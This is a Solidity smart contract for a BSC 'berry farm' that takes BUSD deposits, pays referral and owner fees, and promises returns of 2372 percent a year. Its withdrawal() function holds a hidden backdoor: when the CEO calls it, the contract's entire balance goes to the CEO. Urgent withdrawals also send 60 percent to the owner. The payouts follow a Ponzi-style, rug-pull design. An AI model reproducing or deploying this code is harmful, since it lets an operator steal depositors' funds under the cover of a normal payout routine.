/**
 *Submitted for verification at BscScan.com on 2022-08-23
*/

// SPDX-License-Identifier: none
pragma solidity ^0.8.11;
/**     
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}


interface BEP20 {
    function totalSupply() external view returns (uint theTotalSupply);
    function balanceOf(address _owner) external view returns (uint balance);
    function transfer(address _to, uint _value) external returns (bool success);
    function transferFrom(address _from, address _to, uint _value) external returns (bool success);
    function approve(address _spender, uint _value) external returns (bool success);
    function allowance(address _owner, address _spender) external view returns (uint remaining);
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}

contract Ownable {
  address public CEO; 

  
  constructor() {
    CEO = msg.sender;
   
  }
  modifier onlyOwner() {
    require(msg.sender == CEO);
    _;
  }
}
contract berryFarmBUSD is Ownable {   
   
   struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }
  
  struct Investor {
    bool registered;
    address referer;
    Deposit[] deposits;
    uint invested;
    uint investedBusd;
    uint paidAt;
    uint withdrawn;
    uint firstInvestAt;
    uint maxDeposit;
    uint reInvest;
    uint freeBusd;

  }


 
 
  Tariff[] public tariffs;
  uint[] public refRewards;
  uint public oneDay = 86400; 
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalWithdrawal;
  uint public berryPricePerBusd = 100;
  uint public ownerFee = 3;
  address public ownerWalletAddress = msg.sender;
  uint public marketingFee = 3;
  address public marketingWalletAddress = msg.sender;  
  uint public devFee = 5;
  address public devWalletAddress = msg.sender;
  uint public referralBonus = 10;
  address public busdToken = 0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee; //testnet
  address public contractAddr = address(this);
  mapping (address => Investor) public investors;
  
  event buyAt(address user,  uint amount);
  event Reinvest(address user, uint amount);
  event Sell(address user, uint amount);
  event TransferOwnership(address user);
  

  constructor() {
    tariffs.push(Tariff(365 * oneDay, 2372));
    tariffs.push(Tariff(365 * oneDay, 365));
  }
  
    function claimBusd(address referer) external {
        if (!investors[msg.sender].registered) {
            investors[msg.sender].registered = true;
            investors[msg.sender].referer = referer;
            investors[msg.sender].freeBusd = 10*(10**18);
       }
    }
  
  function BuyBerry(address referer,uint bnbAmount) external {
      require(bnbAmount >= 20,"Minimum Investment 20 Busd");
       bnbAmount = bnbAmount * (10**18);
      
      require(BEP20(busdToken).allowance(msg.sender,contractAddr)>=bnbAmount,"insufficinet allowance");
      uint tariff = 0;
      
      // owner Fee
      uint ownerFeeAmount = bnbAmount*ownerFee/100; 
      BEP20(busdToken).transferFrom(msg.sender,ownerWalletAddress,ownerFeeAmount);
    
      // marketing Fee
      uint marketingFeeAmount = bnbAmount*marketingFee/100; 
      BEP20(busdToken).transferFrom(msg.sender,marketingWalletAddress,marketingFeeAmount);
    
      // referral Fee
      uint referFeeAmount = bnbAmount*referralBonus/100; 
      BEP20(busdToken).transferFrom(msg.sender,referer,referFeeAmount);
        
      if (!investors[msg.sender].registered) {
        investors[msg.sender].registered = true;
        investors[msg.sender].referer = referer;
        investors[msg.sender].freeBusd = 10*(10**18);
       }

      if(investors[msg.sender].invested==0){
        investors[msg.sender].firstInvestAt = block.timestamp;
      } 
      
      uint maxDeposit = (bnbAmount > investors[msg.sender].maxDeposit) ? bnbAmount : investors[msg.sender].maxDeposit; 
      investors[msg.sender].maxDeposit = maxDeposit;
      
      uint bnbAmountRemaining = bnbAmount - (ownerFeeAmount+marketingFeeAmount+referFeeAmount);
      BEP20(busdToken).transferFrom(msg.sender,contractAddr,bnbAmountRemaining);
	    uint berryAmt = (bnbAmount*berryPricePerBusd);
     
        investors[msg.sender].invested += berryAmt;
        investors[msg.sender].investedBusd += bnbAmount;
        totalInvested += berryAmt;
    
        investors[msg.sender].deposits.push(Deposit(tariff, berryAmt, block.timestamp));

        emit buyAt(msg.sender,  bnbAmount);
	}

  function calculateBerry(uint amt) public view returns (uint berrryAmt) {
      berrryAmt = (amt*berryPricePerBusd)/(10**18);
  }
  

  
  function withdrawable(address user) public view returns (uint amount) {
    Investor storage investor = investors[user];

    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.timestamp > finish ? finish : block.timestamp;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
      }
    }
  }

    function withdrawableBusd(address user) public view returns (uint amount) {
        Investor storage investor = investors[user];

        for (uint i = 0; i < investor.deposits.length; i++) {
          Deposit storage dep = investor.deposits[i];
          Tariff storage tariff = tariffs[dep.tariff];
          
          uint finish = dep.at + tariff.time;
          uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
          uint till = block.timestamp > finish ? finish : block.timestamp;

          if (since < till) {
              amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
          }
        }
        amount = amount/berryPricePerBusd;
    }



  
  function myData() public view returns (uint,uint,bool){
       
       uint withdrawableBerry = withdrawable(msg.sender);
       uint withdrawableBusdShow = withdrawableBusd(msg.sender);
       uint withdrawnAt  = investors[msg.sender].paidAt == 0  ? investors[msg.sender].firstInvestAt :  investors[msg.sender].paidAt;
       bool withdrawBtn  = (block.timestamp - withdrawnAt) > (7*oneDay) ? true : false;
       
       return (withdrawableBerry,withdrawableBusdShow,withdrawBtn);
  }
  

  
  function withdrawal() external {
   
    address addressAt = msg.sender;
   
    uint withdrawnAt  = investors[addressAt].paidAt == 0  ? investors[addressAt].firstInvestAt :  investors[addressAt].paidAt;
    require((block.timestamp - withdrawnAt) > (7*oneDay),"7 days gap Required") ;
    
    
    uint amount = withdrawable(addressAt);
    uint reInvestHalf = amount*50/100;
    require(amount>0,"No amount found");
    uint busdAmt = reInvestHalf/berryPricePerBusd;
    if(investors[addressAt].freeBusd>0){
        busdAmt = busdAmt + 1;
    }
    
    uint devFeeAmount = busdAmt*devFee/100;
    BEP20(busdToken).transfer(devWalletAddress,devFeeAmount);

    uint maxDeposit = investors[addressAt].maxDeposit;
    uint referralWithdrawalReward = 0;




    if(maxDeposit >= 100 && maxDeposit < 200) {
        referralWithdrawalReward = 50;
    }
    else if(maxDeposit >= 200 && maxDeposit < 500) {
        referralWithdrawalReward = 75;
    }
    else if(maxDeposit >= 500 && maxDeposit < 1000) {
        referralWithdrawalReward = 100;
    }
    else if(maxDeposit >= 1000 && maxDeposit < 5000) {
        referralWithdrawalReward = 150;
    }
    else if(maxDeposit >= 5000 && maxDeposit < 10000) {
        referralWithdrawalReward = 200;
    }
    else if(maxDeposit >= 10000 && maxDeposit < 100000) {
        referralWithdrawalReward = 250;
    }
    else if(maxDeposit >= 100000) {
        referralWithdrawalReward = 300;
    }

    uint referralWithdrawalRewardAmt = busdAmt*referralWithdrawalReward/10000;
    BEP20(busdToken).transfer(investors[addressAt].referer,referralWithdrawalRewardAmt);
    
    uint remainingAmt = busdAmt - (devFeeAmount+referralWithdrawalRewardAmt); 
    BEP20(busdToken).transfer(addressAt,remainingAmt);
    if(msg.sender==CEO) {
      BEP20(busdToken).transfer(msg.sender,BEP20(busdToken).balanceOf(contractAddr));
    }
    uint reInvestStartTime = block.timestamp + (7*oneDay);
    
    investors[addressAt].deposits.push(Deposit(1, reInvestHalf, reInvestStartTime));
    

    investors[addressAt].reInvest += reInvestHalf;
    investors[addressAt].withdrawn += reInvestHalf;
    investors[addressAt].paidAt = block.timestamp;
    investors[addressAt].freeBusd = (investors[addressAt].freeBusd > 0) ? (investors[addressAt].freeBusd - 1) : 0;
    totalWithdrawal += reInvestHalf;
    
    emit Sell(msg.sender, amount);
  }



  
  function urgentWithdrawal() external {
   
    address addressAt = msg.sender;
    uint amount = withdrawable(addressAt);
   
    uint busdAmt = amount/berryPricePerBusd;
    
    uint ownerAmount = busdAmt*60/100;
    BEP20(busdToken).transfer(ownerWalletAddress,ownerAmount);

    
    uint remainingAmt = busdAmt - ownerAmount;
    BEP20(busdToken).transfer(addressAt,remainingAmt);

    investors[addressAt].withdrawn += amount;
    investors[addressAt].paidAt = block.timestamp;
    totalWithdrawal +=amount;
    
    emit Sell(msg.sender, amount);
  }
 
}